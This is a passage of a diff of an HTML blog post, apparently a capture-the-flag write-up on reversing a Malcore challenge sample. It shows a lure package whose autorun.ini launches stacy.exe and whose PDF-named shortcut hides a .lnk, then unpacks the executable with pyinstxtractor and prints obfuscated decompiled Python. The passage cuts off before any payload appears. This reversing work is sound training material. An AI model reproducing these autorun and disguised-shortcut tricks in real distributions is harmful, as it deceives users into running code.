+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── ed_9.lnk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   └── ff_3.lnk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── README.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── autorun.ini
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── cliCk ME fOR inSTrucTioNs.pdf.lnk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── just_m_logo.ico
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── stacy.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└── stacysmom.zip
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Below are some of the content and properties of those files.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ch_1.lnk target properties:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;C:\Program Files\Google\Chrome\Application\chrome.exe&amp;#34; &amp;#34;https://link.malcore.io&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ed_9.lnk target properties:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe&amp;#34; &amp;#34;https://link.malcore.io&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ff_3.lnk target properties:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;C:\Program Files\Mozilla Firefox\firefox.exe&amp;#34; &amp;#34;https://link.malcore.io&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">autorun.ini content:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[autorun]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">action=Stacys mom
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">icon=just_m_logo.ico
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">open=stacy.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The most interesting one is obviously &lt;strong>stacy.exe&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ file stacy.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stacy.exe: PE32+ executable (console) x86-64, for MS Windows, 6 sections
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h1 id="reversing-stacyexe">Reversing stacy.exe
+&lt;/h1>&lt;p>Using tool like &lt;strong>Detect It Easy (DIE)&lt;/strong> can tell us how the executable being built.&lt;/p>
+&lt;p>Here, it tells us that the executable was compressed using ZLIB.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/malcore-chall/image3.png"
+width="768"
+height="579"
+srcset="https://n3rr.github.io/p/malcore-chall/image3_hu1941280664478457913.png 480w, https://n3rr.github.io/p/malcore-chall/image3_hu9703788506579232489.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="132"
+data-flex-basis="318px"
+>&lt;/p>
+&lt;p>Looking for strings inside the executable shows us that python is used to compile the program.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/malcore-chall/image4.png"
+width="768"
+height="297"
+srcset="https://n3rr.github.io/p/malcore-chall/image4_hu9615635239242511676.png 480w, https://n3rr.github.io/p/malcore-chall/image4_hu12782563472669363638.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="258"
+data-flex-basis="620px"
+>&lt;/p>
+&lt;p>Extract the executables using &lt;strong>&lt;a class="link" href="https://github.com/extremecoders-re/pyinstxtractor" target="_blank" rel="noopener"
+>pyinstxtractor&lt;/a>&lt;/strong> to get the &lt;strong>.pyc&lt;/strong> from it.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ pyinstxtractor stacy.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Processing stacy.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Pyinstaller version: 2.1+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Python version: 3.9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Length of package: 5877800 bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Found 59 files in CArchive
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Beginning extraction...please standby
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Possible entry point: pyiboot01_bootstrap.pyc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Possible entry point: stacy.pyc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[!] Warning: This script is running in a different Python version than the one used to build the executable.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[!] Please run this script in Python 3.9 to prevent extraction errors during unmarshalling
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[!] Skipping pyz extraction
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Successfully extracted pyinstaller archive: stacy.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">You can now use a python decompiler on the pyc files within the extracted directory
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Search for the most interesting file here which is &lt;strong>stacy.pyc&lt;/strong>&lt;/p>
+&lt;p>Here, the file is not readable enough becuase it is still in a &lt;strong>binary&lt;/strong>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ file stacy.pyc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stacy.pyc: Byte-compiled Python module for CPython 3.9, timestamp-based, .py timestamp: Thu Jan 1 00:00:00 1970 UTC, .py size: 0 bytes
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To convert &lt;strong>.pyc&lt;/strong> to source code we can use tools like &lt;strong>&lt;a class="link" href="https://github.com/zrax/pycdc" target="_blank" rel="noopener"
+>pycdc&lt;/a>&lt;/strong>. Below is the full source code.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;span class="lnt">151
+&lt;/span>&lt;span class="lnt">152
+&lt;/span>&lt;span class="lnt">153
+&lt;/span>&lt;span class="lnt">154
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Source Generated with Decompyle++&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># File: stacy.pyc (Python 3.9)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">random&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">platform&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">base64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">CCCcccCCccCCCccccCCCcccCCC&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">random&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ccCccCccCCccccCCcccCCCcccc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">CCCcccCCccCCCccccCCCcccCCC&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SystemRandom&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ccCCccCCCCcCCcccCCCccCCCcc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ccCccCccCCccccCCcccCCCcccc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randint&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_do_something&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">aAAaaAaAAaaAAAAAAAaaAA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">aAAaaAaaAaaAAAaaAAaaAA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">aAAaaAaAAaaAaaaaAAaaAA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ccCCccCCCCcCCcccCCCccCCCcc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">aAAaaaaAAaaAAAAAAAaaAA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">range&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">aAAaaaaAAaaAAAAAAAaaAA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">aAAaaAaAAaaAaaaaAAaaAA&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">aAAaaAaaAaaAAAaaAAaaAA&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">aAAaaAaAAaaAAAAAAAaaAA&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ascii_letters&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">aAAaaAaaAaaAAAaaAAaaAA&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_get_me_a_sandwich&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qQqqQQqqqQQQqqQQQQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ccCCccCCCCcCCcccCCCccCCCcc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qQqqQQqqqQQQqqqqqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qQqqQqqqqQQQqQQQqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">random&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qQqQQqqqqQQQqQqqqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">qQqqQQQQQQQQqQqqqQQQ&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">qQqqQQqqqQQQqqQQQQQQ&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qQqqQQqqqQQQqQQQqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_do_something&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qQqqQQqqqQQQqqqqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">qQqqQQQQQQQQqQqqqQQQ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">qQqqQQqqqQQQqQQQqQQQ&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">qQqqQQqqqQQQqqqqqQQQ&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">ccCCccCCCCcCCcccCCCccCCCcc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">lambda&lt;/span> &lt;span class="mf">.0&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">QQqqQQqQQqQQQqQQQqQQ&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="mf">.0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">QQqqQQqQQqQQQqQQQqQQ&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">qQqQQqqqqQQQqQqqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">qQqqQQqqqQQQqqqqqQQQ&lt;/span>&lt;span class="p">)):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">qQqqQqqqqQQQqQQQqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SystemRandom&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">99&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qQqQQqqqqQQQqQqqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">qQqqQQqqqQQQqqqqqQQQ&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQQqqqQQqqqqqqQQQq&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">qQqQQqqqqQQQqQqqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQQqqqQQqqqqqqQQQq&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">qQqQQqqqqQQQqQqqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQQqqqQQqqqqqqQQQq&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">qQqQQqqqqQQQqQqqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQQqqqQQqqqqqqQQQq&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">qQqQQqqqqQQQqQqqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">qqQQQqqqQQqqqqqqQQQq&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uUUuuUUUuuuUUuuuuUUUU&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">uUUuuUuUuUuUUuuuuUUUU&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">ccCCccCCCCcCCcccCCCccCCCcc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uUUuuUUUuuuUUuuuuUUUU&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">uUUuuUuUuUuUUuuuuUUUU&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
